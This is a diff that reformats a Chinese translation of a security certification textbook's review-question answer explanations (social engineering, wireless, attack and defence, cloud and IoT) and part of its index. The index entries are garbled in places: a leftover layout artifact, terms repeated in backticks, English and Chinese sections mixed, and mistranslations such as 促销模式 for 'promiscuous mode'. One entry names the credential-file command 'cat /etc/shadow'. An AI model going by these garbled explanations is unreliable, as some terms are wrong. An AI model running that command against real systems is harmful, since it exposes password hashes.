@@ -13356,9 +14357,6 @@ Chapter 10: Social Engineering
 3. B. 当看到他人行为时，人们会认为该行为是可以接受的。看到一排人排队抢 USB 马达，即使知道其危险，也可能降低防御，因无 reciprocity 或 authority，虽可能有 scarcity，但不是主要驱动力。
 
 4. D. 生物特征和徽章访问属于物理访问控制。电话验证可能用于验证身份，但不防止 tailgating。Man trap 能防止 tailgating，因为它一次只允许一个人通过。
-
-
-
 
 5. B. 尤其是在企业中，通常会有一些认证方式。这可能以预共享密钥或用户名/密码组合的形式出现。无论哪种情况，当你使用无线网络的社会工程学时，你大概率是在尝试获取凭证以访问网站。你不太可能用这种方式发送钓鱼信息或获取电子邮件地址，也不会用于进行电话诈骗。
 
@@ -13402,15 +14400,13 @@ Chapter 10: Social Engineering
 
 25. C. 其余选项都是保护个人信息的良好方式。加密文件系统如果里面没有个人信息，可能根本不起保护作用。而且，如果账户被 compromise，文件系统上的数据即使用户权限，攻击者仍能访问。
 
-Chapter 11: Wireless Security
+## Chapter 11: Wireless Security
 
 1. D. 基础设施无线网络（infrastructure wireless network）使用接入点（access point），而自组织无线网络（ad hoc wireless network）由参与者自行组织。这两种是无线网络的主要类型。星、环、总线和混合都是有线拓扑结构。
 
 2. B. WPA 握手使用四个阶段。这四步过程用于派生密钥并协商功能。
 
 3. B. 促销模式（promiscuous mode）用于在网络接口上收集所有非目标帧，但仅在有线网络上才足够，因为无线电头信息不会被捕获。要捕获无线电头，需要在促销模式之外启用监听模式（monitor mode），只有监听模式才能获取完整的无线电头信息。
-
-
 
 4. C. Sniffing 可以用于收集后续发起无线攻击所需的信息。去认证攻击（deauthentication attack）可强制设备生成流量。恶意双子攻击（evil twin attack）利用一个恶意的接入点假装成合法网络。要解密网络流量，你需要密钥。获取密钥的一种方法是重用已生成已知密钥的流量信息，这称为密钥重装攻击（key reinstallation attack）。
 
@@ -13425,6 +14421,8 @@ Chapter 11: Wireless Security
 9. B. 四阶段握手用于向无线网络的站点进行认证。握手过程中会生成加密密钥。密钥在交易的两端各自派生，而非直接交换。这全部在四阶段握手中完成。密钥不会直接传递。只有在四阶段握手完成并生成密钥后，才能对消息进行加密。不存在所谓的初始化种子。
 
 10. C. 服务集标识符（SSID）用于标识网络，是你在尝试连接网络时选择的名称。SSID 不是 MAC 地址，也与密钥或加密无关。
+
+
 
 11. D. 临时（ad hoc）和基础设施（infrastructure）是无线网络的两种类型。只有基础设施使用接入点，但基础设施本身不是接入点的类型。WPA 是加密协议。恶意双子攻击使用的“邪恶双子接入点”（rogue access point）是指伪装成合法接入点的非授权接入点。
 
@@ -13459,8 +14457,6 @@ Chapter 11: Wireless Security
 ## Chapter 12: Attack and Defense
 
 1. B. 虽然 DNS 也可用于放大攻击，但 Smurf 攻击是有人向网络广播地址发送 ICMP 回显请求。回显响应会被发送到请求的来源地址（被伪造），如果足够多的系统响应，流量量会压倒目标系统。
-
-
 
 2. C. SQL 注入攻击利用 SQL 查询，查询中可能包含会改变应用程序流程的逻辑。在提供的示例中，目的是强制 SQL 查询的结果始终为真。它的写法是为了转义应用程序中已存在的查询。其它攻击都不使用类似示例的语法。
 
@@ -13507,7 +14503,6 @@ Chapter 11: Wireless Security
 23. D. 防御深度（Defense in depth）主要关注保护，而可防御的网络架构则关注能够遏制攻击者并监控其活动。DMZ 用于保护更大网络免受攻击者。防火墙用于保护，蜜罐是欺骗机制，恶意软件防护侧重于保护。
 
 24. C. 蜜罐（Honeypot）用于诱骗攻击者，提供感兴趣的内容让他们在该系统上停留，从而便于监控。防火墙可以阻断恶意流量，但不会用于陷阱。DMZ 用于将面向 Internet 的系统与企业内部网络隔离。
-
 
 25. A. 一个堆栈守护（stack canary）可以用于检测缓冲区溢出攻击。缓冲区溢出是一种攻击技术。返回 `libc` 是利用固定、已知地址在缓冲区溢出攻击期间跳转的方法。不存在“返回 JavaScript”的说法。
 
@@ -13561,8 +14556,6 @@ Chapter 11: Wireless Security
 
 3. C. JSON（JavaScript Object Notation）使用键值对存储数据。虽然理论上可以在 JSON 中表示关系型数据库，但这并不高效。SQL 是用于查询关系型数据库的语言，文档型数据库更可能使用其他文档格式来存储数据。
 
-
-
 4. C. NIST 网络安全框架规定了五个功能：识别、保护、检测、响应、恢复。
 
 5. C. ISO 27001 规范采用的方法与 NIST 网络安全框架不同。ISO 27001 规定了计划、执行、检查、改进四个步骤。
@@ -13585,6 +14578,8 @@ Chapter 11: Wireless Security
 
 14. C. Bell–LaPadula 简单安全属性规定，主体不能读取高于其安全级别的对象。其他选项均不正确。
 
+
+
 15. D. 部分答案混合了 NIST 的五个功能与 ISO 27001 的循环阶段。唯一仅包含 ISO 27001 阶段的选项是 D，即计划、执行、检查、改进。
 
 16. B. 云端应用常被零信任企业使用，而多因素认证是必需的，因为所有资源访问都必须经过认证。VPN 和 VDI 经常用于让远程客户端访问资源。
@@ -13597,62 +14592,79 @@ Chapter 11: Wireless Security
 
 20. B. Syslog 是 Unix 系统的日志系统，可能不适用于 Windows 设备，而 Windows 工作站是常见的用户终端。SAP 是企业软件，可能大多数用户不使用。SCCM 对于管理 Windows 系统至关重要，但并不专门用于保护工作站。EDR（端点检测与响应）可以帮助保护工作站。
 
-Chapter 15: Cloud Computing and the Internet of Things
+# Chapter 15: Cloud Computing and the Internet of Things
 
-1. A. Chromebook 是一款带有传统用户界面的笔记本电脑，包括屏幕和键盘。其他设备虽连网但没有传统用户界面，仍可被网络访问者访问。
+## 1. A
+Chromebook 是一款带有传统用户界面的笔记本电脑，包括屏幕和键盘。其他设备虽连网但没有传统用户界面，仍可被网络访问者访问。
 
-2. B. HTTP 是无状态协议，需要应用自行处理状态转移。REST（Representational State Transfer）允许客户端与服务器之间交换关于客户端和应用状态的信息。HTML 不是协议而是语言，因而“状态”概念不适用。
+## 2. B
+HTTP 是无状态协议，需要应用自行处理状态转移。REST（Representational State Transfer）允许客户端与服务器之间交换关于客户端和应用状态的信息。HTML 不是协议而是语言，因而“状态”概念不适用。
 
-3. D. 基础设施即服务（IaaS）将操作系统的控制权交给客户。其他服务则把更多控制权交给服务提供商。
+## 3. D
+基础设施即服务（IaaS）将操作系统的控制权交给客户。其他服务则把更多控制权交给服务提供商。
 
-4. C. 云原生设计利用众多技术使应用更具响应性，常见包括容器（应用虚拟化）。虚拟机启动比容器慢。自动化和微服务架构是云原生设计的重要组成部分。
+## 4. C
+云原生设计利用众多技术使应用更具响应性，常见包括容器（应用虚拟化）。虚拟机启动比容器慢。自动化和微服务架构是云原生设计的重要组成部分。
 
-5. B. 自动化带来一致性，因为脚本每次执行都相同，从而实现可重复性，也便于测试。但不一定提供容错能力。
+## 5. B
+自动化带来一致性，因为脚本每次执行都相同，从而实现可重复性，也便于测试。但不一定提供容错能力。
 
-6. C. 计算设备通常遵循冯·诺曼架构：拥有内存、存储和处理器。通用计算设备会有输入/输出接口供用户交互；物联网设备则有专用的、可能不易让普通用户交互的输入/输出设备。例如，智能恒温器只有简单显示，用于显示温度并让用户调节期望温度。
+## 6. C
+计算设备通常遵循冯·诺曼架构：拥有内存、存储和处理器。通用计算设备会有输入/输出接口供用户交互；物联网设备则有专用的、可能不易让普通用户交互的输入/输出设备。例如，智能恒温器只有简单显示，用于显示温度并让用户调节期望温度。
 
-7. C. 存储即服务（Storage as a Service）用于存储文档，并可共享这些文档。虽然其他云服务也能共享文档，但存储即服务是最常见的选择。
+## 7. C
+存储即服务（Storage as a Service）用于存储文档，并可共享这些文档。虽然其他云服务也能共享文档，但存储即服务是最常见的选择。
 
-8. B. Cloudscan 用于评估云服务。Samba 是基于服务器消息块（SMB）协议的网络共享应用。Postman 是用于测试 Web API 的工具。`nmap` 是端口扫描工具，可用于识别网络中的设备及其开放端口。
+## 8. B
+Cloudscan 用于评估云服务。Samba 是基于服务器消息块（SMB）协议的网络共享应用。Postman 是用于测试 Web API 的工具。`nmap` 是端口扫描工具，可用于识别网络中的设备及其开放端口。
 
-9. D. 虽然 NoSQL 数据库、数据总线和微服务架构可以用于构建带移动前端的 Web 应用，但最可能的实现方式是 RESTful API，因为它抽象了后端实现，无论后端是什么都能通过 API 与移动设备交互。
+## 9. D
+虽然 NoSQL 数据库、数据总线和微服务架构可以用于构建带移动前端的 Web 应用，但最可能的实现方式是 RESTful API，因为它抽象了后端实现，无论后端是什么都能通过 API 与移动设备交互。
 
-10. C. 实施安全控制是必不可少的，无论服务部署在何处。企业通常知道如何在本地系统中实施这些控制，但可能不清楚在云环境中如何正确实施。其他选项虽可能在本地环境中出现问题，但并非专属于云环境的挑战。
+## 10. C
+实施安全控制是必不可少的，无论服务部署在何处。企业通常知道如何在本地系统中实施这些控制，但可能不清楚在云环境中如何正确实施。其他选项虽可能在本地环境中出现问题，但并非专属于云环境的挑战。
 
+## 11. B
+雾计算是一种提供更贴近“地面”的计算和存储资源的方式，其中物联网设备通常位于此处。云原生设计可用于支持使用云服务的物联网设备，但云服务本身并不等同于雾计算。访问管理是任何良好安全设计的重要组成部分，但雾计算并不专门支持访问管理。最后，网格计算是一种分布式处理模型。
 
+## 12. A
+SETI@home 是网格计算的一个例子，因为它在大量系统之间进行分布式处理。Shodan.io 和 Thingful 都与物联网相关，而 OWASP Top 10 是一份 Web 应用程序漏洞清单。
 
+## 13. C
+`botnet` 可能使用分布式计算模型来执行任务，这属于网格计算。云原生设计和 RESTful 处理与 Web 应用相关。雾计算与控制相关，且与物联网设备的存储关联。
 
-11. B. 雾计算是一种提供更贴近“地面”的计算和存储资源的方式，其中物联网设备通常位于此处。云原生设计可用于支持使用云服务的物联网设备，但云服务本身并不等同于雾计算。访问管理是任何良好安全设计的重要组成部分，但雾计算并不专门支持访问管理。最后，网格计算是一种分布式处理模型。
+## 14. D
+不安全的第三方组件、配置错误以及访问控制问题都是构建主要基于无服务器函数的服务器端 Web 应用时可能出现的情况。由于没有关联的服务器，也没有保证函数运行的操作系统类型，无服务器函数更可能成为命令注入攻击的目标。
 
-12. A. SETI@home 是网格计算的一个例子，因为它在大量系统之间进行分布式处理。Shodan.io 和 Thingful 都与物联网相关，而 OWASP Top 10 是一份 Web 应用程序漏洞清单。
+## 15. D
+云计算的共享责任模型意味着存在一个滑动尺度，客户端或提供商将负责服务的不同方面。无论使用何种服务，客户始终负责数据，因为数据始终属于客户。
 
-13. C.  botnet 可能使用分布式计算模型来执行任务，这属于网格计算。云原生设计和 RESTful 处理与 Web 应用相关。雾计算与控制相关，且与物联网设备的存储关联。
+## 16. A
+传感器和执行器是实现自动化制造的物理设备。由于它们拥有最少的“智能”，因此在 Purdue 模型中位于最低层。其他选项则位于模型的更高层。
 
-14. D. 不安全的第三方组件、配置错误以及访问控制问题都是构建主要基于无服务器函数的服务器端 Web 应用时可能出现的情况。由于没有关联的服务器，也没有保证函数运行的操作系统类型，无服务器函数更可能成为命令注入攻击的目标。
+## 17. B
+分段是 Purdue 模型中最重要的方面，因为它能够为脆弱或敏感的设备提供更好的保护。其他的选项在此情境下均不合理。
 
-15. D. 云计算的共享责任模型意味着存在一个滑动尺度，客户端或提供商将负责服务的不同方面。无论使用何种服务，客户始终负责数据，因为数据始终属于客户。
+## 18. C
+强制执行多因素认证 (`MFA`) 是防止凭证被盗的最佳措施。即使密码很长，如果被窃取也无济于事。其他的两种方法对凭证被盗的影响也不大。
 
-16. A. 传感器和执行器是实现自动化制造的物理设备。由于它们拥有最少的“智能”，因此在 Purdue 模型中位于最低层。其他选项则位于模型的更高层。
+## 19. A
+云服务以及本地服务的一个常见问题是配置错误。这可能包括不小心将包含敏感数据的 S3 桶设置为公开。提供商的改变以及软件即服务 (`SaaS`) 并不会直接影响数据暴露。内部威胁并不是云基于服务的专属问题。
 
-17. B. 分段是 Purdue 模型中最重要的方面，因为它能够为脆弱或敏感的设备提供更好的保护。其他的选项在此情境下均不合理。
-
-18. C. 强制执行多因素认证 (MFA) 是防止凭证被盗的最佳措施。即使密码很长，如果被窃取也无济于事。其他的两种方法对凭证被盗的影响也不大。
-
-19. A. 云服务以及本地服务的一个常见问题是配置错误。这可能包括不小心将包含敏感数据的 S3 桶设置为公开。提供商的改变以及软件即服务 (SaaS) 并不会直接影响数据暴露。内部威胁并不是云基于服务的专属问题。
-
-20. D. 模板、Ansible 和 PowerShell 都用于自动化在云环境中部署系统。虽然容器可以部署，但它们并不用于自动化部署。
+## 20. D
+模板、`Ansible` 和 `PowerShell` 都用于自动化在云环境中部署系统。虽然容器可以部署，但它们并不用于自动化部署。
 
 # Index
 
 ## A
 
-* A (address) records, 132
+* `A` (address) records, 132
 
-* A2DP (Advanced Audio Distribution), 495–496
+* `A2DP` (Advanced Audio Distribution), 495–496
 
-* AAAA records, 132
+* `AAAA` records, 132
 
-* Abstract Syntax Notation One (ASN.1), 258
+* `Abstract Syntax Notation One` (`ASN.1`), 258
 
 * acceptance, of risk, 68
 
@@ -13666,41 +14678,41 @@ Chapter 15: Cloud Computing and the Internet of Things
 
     * management of, as a common cloud threat, 639–641
 
-* ACK flag, 39, 167, 169, 212, 419
+* `ACK` flag, 39, 167, 169, 212, 419
 
 * Acknowledgement Number field, 38
 
 * Actions on Objectives stage, in Lockheed Martin Cyber Kill Chain, 8, 602
 
-* Active Directory (AD), 300–302, 622, 626
+* `Active Directory` (`AD`), 300–302, 622, 626
 
 * ad hoc network, 473–474
 
-* address (A) records, 132
+* address (`A`) records, 132
 
-* Address Resolution Protocol (ARP) 
+* `Address Resolution Protocol` (`ARP`) 
 
     * as a Data Link layer protocol, 22
 
     * spoofing, 418–422
 
-* address space layout randomization (ASLR), 533–534, 535
+* address space layout randomization (`ASLR`), 533–534, 535
 
 * addressing, 29–30, 34–35
 
 * administrative privileges, 168
 
-* ADSs (alternate data streams), 330–331
+* `ADSs` (alternate data streams), 330–331
 
-* Advanced Audio Distribution (A2DP), 495–496
+* `Advanced Audio Distribution` (`A2DP`), 495–496
 
-* Advanced Encryption Standard (AES), 236, 556–558
+* `Advanced Encryption Standard` (`AES`), 236, 556–558
 
-* advanced persistent threats (APTs), 72
+* advanced persistent threats (`APTs`), 72
 
-* AFL (American Fuzzy Lop) tool, 312
+* `AFL` (American Fuzzy Lop) tool, 312
 
-* African Network Information Center (AfrNIC), 110
+* African Network Information Center (`AfrNIC`), 110
 
 * `aircrack-ng`, 486, 490
 
@@ -13712,23 +14724,23 @@ Chapter 15: Cloud Computing and the Internet of Things
 
 * `airodump-ng`, 490–491
 
-* Akamai, 529
+* `Akamai`, 529
 
 * alterations, as an evasion technique, 219
 
-* alternate data streams (ADSs), 330–331
+* alternate data streams (`ADSs`), 330–331
 
-* Amazon Machine Images (AMIs), 50
+* `Amazon Machine Images` (`AMIs`), 50
 
-* Amazon Web Services (AWS), 49, 593–594, 616, 633, 639, 641
+* `Amazon Web Services` (`AWS`), 49, 593–594, 616, 633, 639, 641
 
-* American Fuzzy Lop (AFL) tool, 312
+* `American Fuzzy Lop` (`AFL`) tool, 312
 
-* American Registry for Internet Numbers (ARIN), 110
+* `American Registry for Internet Numbers` (`ARIN`), 110
 
-* American Standard Code for Information Interchange (ASCII), 21, 518
+* `American Standard Code for Information Interchange` (`ASCII`), 21, 518
 
-* AMIs (Amazon Machine Images), 50
+* `AMIs` (`Amazon Machine Images`), 50
 
 * analysis 
 
@@ -13736,7 +14748,7 @@ Chapter 15: Cloud Computing and the Internet of Things
 
     * packet, 412–417
 
-* Ansible, 631–632
+* `Ansible`, 631–632
 
 * answers to review questions 
 
@@ -13748,7 +14760,7 @@ Chapter 15: Cloud Computing and the Internet of Things
 
     * enumeration, 672–674
 
-    * Internet of Things (IoT), 695–697
+    * Internet of Things (`IoT`), 695–697
 
     * malware, 678–680
 
@@ -13774,19 +14786,19 @@ Chapter 15: Cloud Computing and the Internet of Things
 
 * Apache Server, running `slowhttptest` against, 530
 
-* APIs (application programming interfaces) 
+* `APIs` (application programming interfaces) 
 
     * about, 369
 
     * rootkits and, 326–327
 
-* APNIC (Asia Pacific Network Information Centre), 110
+* `APNIC` (Asia Pacific Network Information Centre), 110
 
-* Apple 
+* `Apple` 
 
-    * Face ID, 445
+    * `Face ID`, 445
 
-    * iCloud, 619
+    * `iCloud`, 619
 
 * application binary interface, 360–361
 
@@ -13796,7 +14808,7 @@ Chapter 15: Cloud Computing and the Internet of Things
 
     * OSI model, 21, 79–80
 
-* application programming interfaces (APIs) 
+* application programming interfaces (`APIs`) 
 
     * about, 369
 
@@ -13808,734 +14820,581 @@ Chapter 15: Cloud Computing and the Internet of Things
 
         * about, 587
 
+        * cloud‑based, `cloud‑based`, 593–595
 
+        * database considerations, `database considerations`, 595–598
 
--   cloud‑based, `cloud‑based`, 593–595
--   database considerations, `database considerations`, 595–598
--   n‑tier design, `n‑tier design`, 588–591
--   service‑oriented, `service‑oriented`, 591–593
--   exploitation of 
-    -   about, `about`, 531
-    -   application protections and evasions, `application protections and evasions`, 535–536
-    -   buffer overflow, `buffer overflow`, 532–534
-    -   heap spraying, `heap spraying`, 534
--   APTs (advanced persistent threats), `APTs`, 72
--   arbitrary code execution, `arbitrary code execution`, 531
--   architecture 
-    -   cloud, `cloud`, 625–638
-    -   of CPUs, `of CPUs`, 366
-    -   defensible network, `defensible network`, 90–91
-    -   Internet Protocol (IP), `Internet Protocol (IP)`, 23–24
-    -   network, `network`, 42–46
-    -   Transmission Control Protocol (TCP), `Transmission Control Protocol (TCP)`, 23–24
--   ARIN (American Registry for Internet Numbers), `ARIN`, 110
--   ARP (Address Resolution Protocol) 
-    -   as a Data Link layer protocol, `as a Data Link layer protocol`, 22
-    -   spoofing, `spoofing`, 418–422
--   ARP poisoning, `ARP poisoning`, 418
--   ARPAnet, `ARPAnet`, 341–342
--   `arpspoof`, `arpspoof`, 419–420
--   ASCII (American Standard Code for Information Interchange), `ASCII`, 21, 518
--   Asia Pacific Network Information Centre (APNIC), `Asia Pacific Network Information Centre (APNIC)`, 110
--   ASLR (address space layout randomization), `ASLR`, 533–534, 535
--   ASN.1 (Abstract Syntax Notation One), `ASN.1`, 258
--   Assessment tab (Nessus), `Assessment tab`, 205
--   asymmetric key cryptography 
-    -   about, `about`, 558–559
-    -   elliptic curve cryptography (ECC), `elliptic curve cryptography (ECC)`, 560–562
-    -   hybrid cryptosystem, `hybrid cryptosystem`, 559
-    -   nonrepudiation, `nonrepudiation`, 559–560
--   attacks 
-    -   about, `about`, 512, 542–543
-    -   answers to review questions, `answers to review questions`, 688–691
-    -   application exploitation, `application exploitation`, 531–536
-    -   defense in depth/defense in breadth, `defense in depth/defense in breadth`, 538–540
-    -   defensible network architecture, `defensible network architecture`, 540–542
-    -   denial‑of‑service (DoS) attacks, `denial‑of‑service (DoS) attacks`, 526–531
-    -   lateral movement, `lateral movement`, 536–538
-    -   lifecycle for, `lifecycle for`, 8–10, 72
-    -   on mobile devices, `on mobile devices`, 500–504
-    -   modeling 
-        -   about, `about`, 6–7
-        -   attack life cycle, `attack life cycle`, 8–10
-        -   cyber kill chain, `cyber kill chain`, 7–8
-        -   MITRE ATT&CK framework, `MITRE ATT&CK framework`, 10–11
-    -   review questions, `review questions`, 543–548
-    -   slow, `slow`, 529–530
-    -   web application attacks, `web application attacks`, 512–526
-    -   Wi‑Fi, `Wi‑Fi`, 484–495
--   auditing, `auditing`, 93–95
--   authentication 
-    -   failures of, as one of OWASP top ten vulnerabilities, `failures of`, 514–515
-    -   service enumeration and, `service enumeration and`, 236
-    -   Wi‑Fi, `Wi‑Fi`, 477–478
--   authenticity, in Parkerian hexad, `authenticity`, 65
--   authority 
-    -   defined, `defined`, 562
-    -   in theory of influence, `in theory of influence`, 437
--   authorized entities, `authorized entities`, 4
--   automating 
-    -   malware analysis, `malware analysis`, 370–371
-    -   social engineering, `social engineering`, 461–464
--   `autoroute` module, `autoroute module`, 321–322
--   availability, in CIA triad, `availability`, 64
--   avoidance, of risk, `avoidance`, 69
--   AWS (Amazon Web Services), `AWS`, 49, 593–594, 616, 633, 639, 641
--   Azure Active Directory, `Azure Active Directory`, 622–623
--   Background Intelligent Transfer Service (BITS), `Background Intelligent Transfer Service (BITS)`, 325–326
--   badge access, `badge access`, 442–444
--   baiting, `baiting`, 447–448
--   bandwidth attacks, `bandwidth attacks`, 527–529
--   base service set identifier (BSSID), `base service set identifier (BSSID)`, 458–459, 477, 490
--   Beacon (Cobalt Stike), `Beacon (Cobalt Stike)`, 384
--   BeFF (Browser Exploitation Framework), `BeFF`, 492–493
--   Bell‑LaPadula model, `Bell‑LaPadula model`, 586
--   Berkeley Packet Filter (BPF), `Berkeley Packet Filter (BPF)`, 408–410
--   Berkeley Software Distribution (BSD), `Berkeley Software Distribution (BSD)`, 396
--   Biba, Kenneth, `Biba, Kenneth`, 585
--   Biba model, `Biba model`, 585
--   biometrics, `biometrics`, 445–446
--   birthday paradox, `birthday paradox`, 296, 569
--   BitLocker, `BitLocker`, 574
--   BITS (Background Intelligent Transfer Service), `BITS`, 325–326
--   black boxes, `black boxes`, 591
--   black hat, `black hat`, 4
--   black‑box testing, `black‑box testing`, 638
--   Blaster, `Blaster`, 343
--   blog storage, `blog storage`, 620
--   bluebugging, `bluebugging`, 498–499
--   bluedump, `bluedump`, 499
--   bluejacking, `bluejacking`, 498
--   bluesmack, `bluesmack`, 499
--   bluesnarfing, `bluesnarfing`, 498
--   Bluetooth 
-    -   about, `about`, 495–496
-    -   bluebugging, `bluebugging`, 498–499
-    -   bluedump, `bluedump`, 499
-    -   bluejacking, `bluejacking`, 498
-    -   bluesmack, `bluesmack`, 499
-    -   bluesnarfing, `bluesnarfing`, 498
-    -   scanning, `scanning`, 496–498
--   botnet, `botnet`, 344
--   BPF (Berkeley Packet Filter), `BPF`, 408–410
--   bring your own device (BYOD), `bring your own device (BYOD)`, 483–484
--   Broadcom, `Broadcom`, 487
--   Browser Exploitation Framework (BeFF), `Browser Exploitation Framework (BeFF)`, 492–493
--   brute force zone transfers, `brute force zone transfers`, 137–138
--   `brute_dirs` module, `brute_dirs module`, 265
--   BSD (Berkeley Software Distribution), `BSD`, 396
--   BSSID (base service set identifier), `BSSID`, 458–459, 477, 490
--   `btscanner` program, `btscanner program`, 496–497
--   buffer overflow, `buffer overflow`, 532–534
--   built‑in utilities, `built‑in utilities`, 243–247
--   Burp Suite, `Burp Suite`, 636–637
--   bus network, `bus network`, 24–25
--   Business Logic layer, in n‑tier application design, `Business Logic layer`, 590
--   BYOD (bring your own device), `BYOD`, 483–484
--   bytes, `bytes`, 34, 564
--   C, Python compared with, `C`, 372–374
--   CA (certificate authority), `CA`, 562–568
--   cacheability, of applications, `cacheability`, 635
--   caching DNS, `caching DNS`, 132
--   CAM (content‑addressable memory), `CAM`, 30–31
--   canonical name (CNAME) records, `canonical name (CNAME) records`, 132, 138
--   captive portal, `captive portal`, 459
--   Cascading Style Sheets (CSS), `Cascading Style Sheets (CSS)`, 517
--   `cat` command, `cat command`, 522
--   `cat /etc/shadow` command, `cat /etc/shadow command`, 295
--   catastrophizing, `catastrophizing`, 67
--   CBC (Cipher Block Chaining), `CBC`, 557
--   C&C (command‑and‑control infrastructure), `C&C`, 344, 382–383
+        * n‑tier design, `n‑tier design`, 588–591
 
+        * service‑oriented, `service‑oriented`, 591–593
 
+    * exploitation of 
 
-CDIs (Constrained Data Items), 587
+        * about, `about`, 531
 
-Censys.io, 646
+        * application protections and evasions, `application protections and evasions`, 535–536
 
-certificate authority (CA), 562–568
+        * buffer overflow, `buffer overflow`, 532–534
 
-certificate revocation lists (CRLs), 565
+        * heap spraying, `heap spraying`, 534
 
-certificates, 562
+* `APTs` (advanced persistent threats), `APTs`, 72
 
-certification rules (CRs), 587
+* arbitrary code execution, `arbitrary code execution`, 531
 
-CGI (common gateway interface) model, 523–524
+* architecture 
 
-ChaCha20, 236
+    * cloud, `cloud`, 625–638
 
-Chaos Computer Club, 8
+    * of CPUs, `of CPUs`, 366
 
-Checksum field, 33, 39
+    * defensible network, `defensible network`, 90–91
 
-CIA triad 
+    * Internet Protocol (`IP`), `Internet Protocol` (`IP`), 23–24
 
-    about, 61
+    * network, `network`, 42–46
 
-    availability, 64
+    * Transmission Control Protocol (`TCP`), `Transmission Control Protocol` (`TCP`), 23–24
 
-    confidentiality, 61–62
+* `ARIN` (`American Registry for Internet Numbers`), `ARIN`, 110
 
-    integrity, 63–64
+* `ARP` (`Address Resolution Protocol`) 
 
-    Parkerian hexad, 65
+    * as a Data Link layer protocol, `as a Data Link layer protocol`, 22
 
-Cialdini, Robert, 436–437
+    * spoofing, `spoofing`, 418–422
 
-CIDR (Classless Inter‑Domain Routing) notation, 36, 169
+* `ARP poisoning`, `ARP poisoning`, 418
 
-CIFS (Common Internet File System), 13
+* `ARPAnet`, `ARPAnet`, 341–342
 
-CIM (computer‑integrated manufacturing), 654
+* `arpspoof`, `arpspoof`, 419–420
 
-Cipher Block Chaining (CBC), 557
+* `ASCII` (`American Standard Code for Information Interchange`), `ASCII`, 21, 518
 
-ciphersuite, 556–557
+* Asia Pacific Network Information Centre (`APNIC`), `Asia Pacific Network Information Centre` (`APNIC`), 110
 
-Cisco, 122
+* `ASLR` (address space layout randomization), `ASLR`, 533–534, 535
 
-Clark‑Wilson Integrity Model, 586–587
+* `ASN.1` (`Abstract Syntax Notation One`), `ASN.1`, 258
 
-classification, of data, 582–584
+* Assessment tab (`Nessus`), `Assessment tab`, 205
 
-Classless Inter‑Domain Routing (CIDR) notation, 36, 169
+* asymmetric key cryptography 
 
-`clearev` command, 329
+    * about, `about`, 558–559
 
-clearing Event Viewer, in Meterpreter, 329
+    * elliptic curve cryptography (`ECC`), `elliptic curve cryptography` (`ECC`), 560–562
 
-client‑server architecture, 634
+    * hybrid cryptosystem, `hybrid cryptosystem`, 559
 
-client‑side vulnerabilities, 305–307
+    * nonrepudiation, `nonrepudiation`, 559–560
 
-cloning, 454–457
+* attacks 
 
-cloud computing 
+    * about, `about`, 512, 542–543
 
-    about, 46–47, 612–616, 655–656
+    * answers to review questions, `answers to review questions`, 688–691
 
-    answers to review questions, 695–697
+    * application exploitation, `application exploitation`, 531–536
 
-    architectures, 625–631
+    * defense in depth/defense in breadth, `defense in depth/defense in breadth`, 538–540
 
-    cloud services, 616–621
+    * defensible network architecture, `defensible network architecture`, 540–542
 
-    common threats, 639–645
+    * denial‑of‑service (`DoS`) attacks, `denial‑of‑service` (`DoS`) attacks, 526–531
 
-    deployment, 631–633
+    * lateral movement, `lateral movement`, 536–538
 
-    grid computing, 624–625
+    * lifecycle for, `lifecycle for`, 8–10, 72
 
-    infrastructure as a service (IaaS), 48–49
+    * on mobile devices, `on mobile devices`, 500–504
 
-    Internet of Things (IoT), 53
+    * modeling 
 
-    operational technology, 652–655
+        * about, `about`, 6–7
 
-    platform as a service (PaaS), 49–51
+        * attack life cycle, `attack life cycle`, 8–10
 
-    public compared with private cloud, 623
+        * cyber kill chain, `cyber kill chain`, 7–8
 
-    REST, 633–638
+        * MITRE ATT&CK framework, `MITRE ATT&CK framework`, 10–11
 
-    review questions, 657–661
 
-    shared responsibility model, 621–623
 
-    software as a service, 51–53
-
-    storage as a service (StaaS), 47–48
-
-cloud‑based applications, 593–595
-
-CloudFormation, 633
-
-cloud‑native design, 629–631
-
-CNAME (canonical name) records, 132, 138
-
-Cobalt Stike's Beacon, 384
-
-Code Red, 343
-
-Collection stage, in MITRE ATT&CK framework, 11, 74–75
-
-collision, 295–296, 569
-
-colon (:), 35
-
-Command and Control stage 
-
-    in Lockheed Martin Cyber Kill Chain, 602
-
-    in MITRE ATT&CK framework, 8, 11, 75
-
-command injection, 521–522
-
-command‑and‑control infrastructure (C&C), 344, 382–383
-
-commitment, in theory of influence, 437
-
-common gateway interface (CGI) model, 523–524
-
-Common Internet File System (CIFS), 13
-
-Common Object Request Broker Architecture (CORBA), 237
-
-common off‑the‑shelf (COTS) malware, 8
-
-Common Vulnerabilities and Exposures (CVE), 181
-
-communication models, 19–24
-
-companies, open source intelligence (OSI) and, 103–104
-
-Complete Mission stage, in life cycle, 10, 536
-
-computer‑integrated manufacturing (CIM), 654
-
-Confidential classification, 583
-
-confidentiality, in CIA triad, 61–62
-
-Constrained Data Items (CDIs), 587
-
-contact spamming, 452
-
-container, 592–593
-
-content‑addressable memory (CAM), [30](#c0><x_0.3219><y_0.6969>><class_Caption>
-
-
-
-
--   [分类，] 582–584
--   [隐藏，] 219, 330–332
--   [完整性，] 515, 585
--   [伪造，] 219
--   [静态数据，] 572
--   [数据泄露，] 641–642
--   [数据加密标准 (DES)，] 555–556
--   [数据处理，] 642
--   [数据层 (n‑tier 应用设计)，] 590
--   [数据链路层 (OSI 模型)，] 22
--   [数据偏移字段，] 38
--   [数据库，] 595–598
--   [DDoS (分布式拒绝服务)，] 528–529
--   [去认证攻击，] 489–491
--   [调试，动态分析和，] 366–370
--   [使用过时且弱化的 RSA 加密 (DROWN)，] 181
--   [深度包检查 (DPI)，] 78–79
--   [防御规避阶段，] 11, 74
--   [防御‑在‑深度 方法，] 89–90, 538–540
--   [防御‑在‑深度 方法，] 87–89, 538–540
--   [可防御的网络架构，] 90–91, 540–542
--   [DELETE 方法，] 631, 635
--   [传输，] 8
--   [传输阶段，] 602
--   [非军事区 (DMZ)，] 44–45, 88, 89, 539, 654
--   [拒绝服务 (DoS) 攻击] 
-    -   [关于，] 64, 526
-    -   [带宽攻击，] 527–529
-    -   [老旧，] 531
-    -   [慢速攻击，] 529–530
--   [部署，云，] 625–638
--   [DES (数据加密标准)，] 555–556
--   [目标地址字段，] 33
--   [目标端口字段，] 37
--   [检测函数，] 600
--   [检测] 
-    -   [保护和，] 223–224
-    -   [嗅探器，] 410–412
-    -   [伪造，] 426–428
--   [设备，] 646
--   [DevOps，] 90
--   [DevSecOps，] 90
--   [DHCP (动态主机配置协议)] 
-    -   [饥饿攻击，] 424–426
